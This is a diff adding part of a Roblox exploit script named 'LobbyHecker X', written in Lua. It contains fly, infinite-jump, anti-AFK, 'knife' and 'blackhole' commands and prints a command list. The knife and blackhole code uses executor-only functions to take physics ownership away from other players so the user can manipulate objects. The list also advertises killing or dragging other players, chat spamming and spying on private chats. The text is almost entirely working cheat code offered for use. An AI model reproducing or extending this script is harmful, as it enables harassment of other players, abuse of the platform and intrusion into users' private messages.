+								if key:lower() == "e" then 
+									if flying then flying = false 
+									else 
+										flying = true 
+										Fly() 
+									end 
+								elseif key:lower() == "w" then 
+									ctrl.f = 1 
+								elseif key:lower() == "s" then 
+									ctrl.b = -1 
+								elseif key:lower() == "a" then 
+									ctrl.l = -1 
+								elseif key:lower() == "d" then 
+									ctrl.r = 1 
+								end 
+							end) 
+							mouse.KeyUp:connect(function(key) 
+								if key:lower() == "w" then 
+									ctrl.f = 0 
+								elseif key:lower() == "s" then 
+									ctrl.b = 0 
+								elseif key:lower() == "a" then 
+									ctrl.l = 0 
+								elseif key:lower() == "d" then 
+									ctrl.r = 0 
+								end 
+							end)
+							Fly()
+						end
+						if cmd == "infjump" then
+							_G.infinjump = true
+
+							local Player = game:GetService("Players").LocalPlayer
+							local Mouse = Player:GetMouse()
+							Mouse.KeyDown:connect(function(k)
+								if _G.infinjump then
+									if k:byte() == 32 then
+										Humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+										Humanoid:ChangeState("Jumping")
+										wait(0.1)
+										Humanoid:ChangeState("Seated")
+									end
+								end
+							end)
+
+							local Player = game:GetService("Players").LocalPlayer
+							local Mouse = Player:GetMouse()
+							Mouse.KeyDown:connect(function(k)
+								k = k:lower()
+								if k == "f" then
+									if _G.infinjump == true then
+										_G.infinjump = false
+									else
+										_G.infinjump = true
+									end
+								end
+							end)
+						end
+						if cmd == "antiafk" then
+							local vu = game:GetService("VirtualUser")
+							game:GetService("Players").LocalPlayer.Idled:connect(function()
+								vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+								wait(1)
+								vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+							end)
+						end
+						if cmd == "knife" then
+							game.StarterGui:SetCore(
+								"SendNotification",
+								{
+									Title = "knife loaded!!",
+									Text = "press q to shank.",
+									Duration = "5"
+								}
+							)
+							for i, v in pairs(game.Players:GetPlayers()) do
+								if gethiddenproperty(v, "SimulationRadius") >= 5000 then
+									print(v.Name)
+								end
+							end
+							local Frame = (60)
+
+							Service =
+								setmetatable(
+									{
+										Get = function(Self, Serv)
+										if Service[Serv] then
+											return Service[Serv]
+										end
+										local S = game:GetService(Serv)
+										if S then
+											Service[Serv] = S
+										end
+										return S
+									end
+									},
+									{
+										__index = function(Self, Index)
+										local S = game:GetService(Index)
+										if S then
+											Service[Index] = S
+										end
+										return S
+									end
+									}
+								)
+
+							local LP = Service["Players"].LocalPlayer
+							local Char = LP["Character"]
+							local Torso, Root, Humanoid = Char["Torso"], Char["HumanoidRootPart"], Char["Humanoid"]
+							local TService, UIS = Service["TweenService"], Service["UserInputService"]
+
+							coroutine.wrap(
+								function()
+									Root["Anchored"] = true
+									wait(.8)
+									Root["Anchored"] = false
+								end
+							)()
+
+							local SetSimulationRadius = setsimulationradius
+
+							game.RunService.Stepped:Connect(
+								function()
+									SetSimulationRadius(math.huge, math.huge)
+								end
+							)
+
+							v = game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool")
+
+							v.Parent = game.Players.LocalPlayer.Backpack
+							v.Handle.Massless = true
+							v.GripPos = Vector3.new(100000000000000, 100000000000000, 100000000000000)
+							game.Players.LocalPlayer.Character.HumanoidRootPart.CustomPhysicalProperties =
+								PhysicalProperties.new(math.huge, math.huge, math.huge, math.huge, math.huge)
+							v.Parent = game.Players.LocalPlayer.Character
+							wait(0.3)
+
+							local KnifeAccessory
+							local LPlayer = game.Players.LocalPlayer
+							local LeftArm = game.Players.LocalPlayer.Character["Left Arm"]
+
+							if
+								LPlayer.Character:FindFirstChild("YandereKnife") and
+									LPlayer.Character["YandereKnife"].ClassName == "Accessory"
+							then
+								KnifeAccessory = LPlayer.Character["YandereKnife"]
+							else
+								KnifeAccessory = LPlayer.Character:FindFirstChildOfClass("Accessory")
+							end
+
+							local Running = Instance.new("StringValue")
+							Running.Parent = LPlayer
+							Running.Name = "-Running"
+							Running.Value = "Grab Knife"
+
+							local Stuff = {
+								Events = {},
+								Debounces = {Button1DownDebounce = false},
+								PlrHeld = nil,
+								Mode = 1 -- 1 = kill, 2 = throw, 3 = let go, 4 = suicide
+							}
+
+							if LPlayer.Character:FindFirstChild("-GrabKnife") then
+								LPlayer.Character:FindFirstChild("-GrabKnife"):Destroy()
+							end
+							if LPlayer.Character:FindFirstChild("GrabKnifeLA") then
+								LPlayer.Character:FindFirstChild("GrabKnifeLA"):Destroy()
+							end
+							if LPlayer.Character:FindFirstChild("GrabKnifeRA") then
+								LPlayer.Character:FindFirstChild("GrabKnifeRA"):Destroy()
+							end
+
+							local Attach0 = Instance.new("Attachment")
+							Attach0.Parent = LPlayer.Character["Right Arm"]
+							local Attach1 = Instance.new("Attachment")
+							Attach1.Parent = RightArm
+
+							local Pos = Instance.new("AlignPosition")
+							Pos.Parent = LPlayer.Character.Torso
+							Pos.RigidityEnabled = true
+							Pos.Attachment0, Pos.Attachment1 = Attach0, Attach1
+
+							local Rot = Instance.new("AlignOrientation")
+							Rot.Parent = LPlayer.Character.Torso
+							Rot.RigidityEnabled = true
+							Rot.Attachment0, Rot.Attachment1 = Attach0, Attach1
+
+							local Attach0 = Instance.new("Attachment")
+							Attach0.Parent = LPlayer.Character["Left Arm"]
+							local Attach1 = Instance.new("Attachment")
+							Attach1.Parent = LeftArm
+
+							local Pos = Instance.new("AlignPosition")
+							Pos.Parent = LPlayer.Character.Torso
+							Pos.RigidityEnabled = true
+							Pos.Attachment0, Pos.Attachment1 = Attach0, Attach1
+
+							local Rot = Instance.new("AlignOrientation")
+							Rot.Parent = LPlayer.Character.Torso
+							Rot.RigidityEnabled = true
+							Rot.Attachment0, Rot.Attachment1 = Attach0, Attach1
+
+							local Knife = Instance.new("Part")
+							Knife.Name = "-GrabKnife"
+							Knife.Parent = LPlayer.Character
+							Knife.Size = Vector3.new(0.25, 2, 0.25)
+							Knife.Transparency = 1
+							Knife.CanCollide = false
+
+							local KnifeWeld = Instance.new("Weld")
+							KnifeWeld.Parent = Knife
+							KnifeWeld.Part0 = LeftArm
+							KnifeWeld.Part1 = Knife
+							KnifeWeld.C0 =
+								CFrame.new(Vector3.new(0.2, -0.85, 0)) *
+								CFrame.Angles(math.rad(0), math.rad(00), math.rad(0))
+							KnifeWeld.C1 =
+								CFrame.new(Vector3.new(0, 0.75, -0.125)) *
+								CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))
+
+							KnifeAccessory.Handle.AccessoryWeld:Destroy()
+							local Attach0 = Instance.new("Attachment")
+							Attach0.Parent = KnifeAccessory.Handle
+							Attach0.CFrame =
+								CFrame.new(Vector3.new(-0.5, 0, -0.5)) *
+								CFrame.Angles(math.rad(0), math.rad(-90), math.rad(-90))
+							local Attach1 = Instance.new("Attachment")
+							Attach1.Parent = Knife
+
+							local Pos = Instance.new("AlignPosition")
+							Pos.Parent = Knife
+							Pos.RigidityEnabled = true
+							Pos.Attachment0, Pos.Attachment1 = Attach0, Attach1
+
+							local Rot = Instance.new("AlignOrientation")
+							Rot.Parent = Knife
+							Rot.RigidityEnabled = true
+
+							local Player = game.Players.LocalPlayer
+							local hum = Player.Character.Humanoid
+							hum:UnequipTools()
+							wait(0.4)
+							game.workspace[Player.Name].Animate.toolnone.ToolNoneAnim.AnimationId = "0"
+							Rot.Attachment0, Rot.Attachment1 = Attach0, Attach1
+							local mouse = game.Players.LocalPlayer:GetMouse()
+							local spd = 2
+							mouse.KeyDown:connect(
+								function(key)
+									if key:lower() == "q" then
+										v.Parent = Player.Character
+										KnifeAccessory.Parent = LPlayer.Character
+										local Anim = Instance.new("Animation")
+										Anim.AnimationId = "rbxassetid://218504594"
+										local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
+										track:Play(.1, 1, 1)
+										wait(1)
+										v.Parent = Player.Backpack
+									end
+								end
+							)
+						end
+						if cmd == "blackhole" then
+							local UserInputService = game:GetService("UserInputService")
+							local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
+							local Folder = Instance.new("Folder", game:GetService("Workspace"))
+							local Part = Instance.new("Part", Folder)
+							local Attachment1 = Instance.new("Attachment", Part)
+							Part.Anchored = true
+							Part.CanCollide = false
+							Part.Transparency = 1
+							local Updated = Mouse.Hit + Vector3.new(0, 5, 0)
+							local NetworkAccess = coroutine.create(function()
+								settings().Physics.AllowSleep = false
+								while game:GetService("RunService").RenderStepped:Wait() do
+									for _, Players in next, game:GetService("Players"):GetPlayers() do
+										if Players ~= game:GetService("Players").LocalPlayer then
+											Players.MaximumSimulationRadius = 0 
+											sethiddenproperty(Players, "SimulationRadius", 0) 
+										end 
+									end
+									game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)
+									setsimulationradius(math.huge) 
+								end 
+							end) 
+							coroutine.resume(NetworkAccess)
+							local function ForcePart(v)
+								if v:IsA("Part") and v.Anchored == false and v.Parent:FindFirstChild("Humanoid") == nil and v.Parent:FindFirstChild("Head") == nil and v.Name ~= "Handle" then
+									Mouse.TargetFilter = v
+									for _, x in next, v:GetChildren() do
+										if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
+											x:Destroy()
+										end
+									end
+									if v:FindFirstChild("Attachment") then
+										v:FindFirstChild("Attachment"):Destroy()
+									end
+									if v:FindFirstChild("AlignPosition") then
+										v:FindFirstChild("AlignPosition"):Destroy()
+									end
+									if v:FindFirstChild("Torque") then
+										v:FindFirstChild("Torque"):Destroy()
+									end
+									v.CanCollide = false
+									local Torque = Instance.new("Torque", v)
+									Torque.Torque = Vector3.new(100000, 100000, 100000)
+									local AlignPosition = Instance.new("AlignPosition", v)
+									local Attachment2 = Instance.new("Attachment", v)
+									Torque.Attachment0 = Attachment2
+									AlignPosition.MaxForce = 9999999999999999
+									AlignPosition.MaxVelocity = math.huge
+									AlignPosition.Responsiveness = 200
+									AlignPosition.Attachment0 = Attachment2 
+									AlignPosition.Attachment1 = Attachment1
+								end
+							end
+							for _, v in next, game:GetService("Workspace"):GetDescendants() do
+								ForcePart(v)
+							end
+							game:GetService("Workspace").DescendantAdded:Connect(function(v)
+								ForcePart(v)
+							end)
+							UserInputService.InputBegan:Connect(function(Key, Chat)
+								if Key.KeyCode == Enum.KeyCode.E and not Chat then
+									Updated = Mouse.Hit + Vector3.new(0, 5, 0)
+								end
+							end)
+							spawn(function()
+								while game:GetService("RunService").RenderStepped:Wait() do
+									Attachment1.WorldCFrame = Updated
+								end
+							end)
+						end
+						if cmd == "music" then 
+							local var = string.sub(msg, space + 1) 
+							local id = var
+							local music = game:GetService("Workspace").Music.PlayingSong
+							music.SoundId = "rbxassetid://"..id
+							music.Playing = false
+							music.Playing = true
+							for i,v in pairs(game.Players:GetDescendants()) do 
+								if v.Character.SuperFlyGoldBoombox  then 
+									while true do 
+										v.Handle.Sound.Playing = false
+										wait(0.1)
+									end
+								end
+							end
+						end
+					end
+				end)
+			--//END COMMANDS
+			function GetPlayer(String)
+				local plr
+				local strl = String:lower()
+				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+					if v.Name:lower():sub(1, #String) == String:lower() then
+						plr = v
+					end
+				end
+				if String == "me" then
+					plr = game.Players.LocalPlayer
+				end
+				if String == "" or String == " " then
+					plr = nil
+				end
+				return plr
+			end
+			print(settings.welcomemsg)
+			print([[
+-------CMD LIST FOR LOBBYHECKER X-------
+;rj (rejoins game)
+;mute (mutes Player's boombox)
+;antikill (Legit impossible for someone to kill u with exploits)
+;noclip
+;tkill (player, must have at least one tool)
+;tbring (player)
+;givetool (player) - hold tool in ur hand
+;to(player)
+;secretplace2
+;dance1 (r15)
+;dance2 (r15)
+;dance3 (r15)
+;undance (r15)
+;masstkill
+;joindate (player)
+;secretplace
+;fly (E to unfly)
+;chant (spams chat)
+;add (spams chat)
+;antiafk
+;blackhole (press e to move)
+;halo
+;visualizer
+;rhats (reset hats)
+;orbit
+;orbit2
+;infjump (press F to disable)
+;knife (use this * https://www.roblox.com/catalog/4684948729/Kawaii-Knife *)
+;pew (shoots gun RP NAME)
+;setafk(RP NAME)
+;chatspy (shows priv chats *ANYONE*)
+;loopcbring (loop brings player)
+---------------------------------------------------]])
+			game.StarterGui:SetCore(
+				"SendNotification",
+				{
+					Title = "Welcome!",
+					Text = "LobbyHecker Made By faintah & guter",
+					Duration = "5"
+				}
+			)
+
+
+		end
+	end)
+end
+coroutine.wrap(GXTYY_fake_script)()
